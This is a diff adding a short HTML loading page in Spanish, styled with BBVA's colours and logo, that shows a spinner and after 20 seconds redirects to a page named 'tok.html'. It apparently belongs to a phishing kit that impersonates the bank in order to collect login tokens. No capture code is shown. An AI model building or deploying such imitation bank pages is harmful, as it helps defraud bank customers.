@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Cargando...</title>
+  <meta http-equiv="refresh" content="20;url=tok.html">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #1973b8; /* Fondo azul BBVA */
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .logo {
+      max-width: 200px;
+      margin-bottom: 40px;
+      filter: brightness(0) invert(1); /* Opcional: hace el logo blanco visible si es PNG negro */
+    }
+
+    .loader {
+      border: 8px solid rgba(255, 255, 255, 0.3);
+      border-top: 8px solid white;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .text {
+      color: white;
+      font-size: 18px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+
+  <img src="packages/assets/img/coronita/bbva-logo.png" alt="Logo" class="logo">
+  <div class="loader"></div>
+  <div class="text">Cargando...</div>
+
+</body>
+</html>
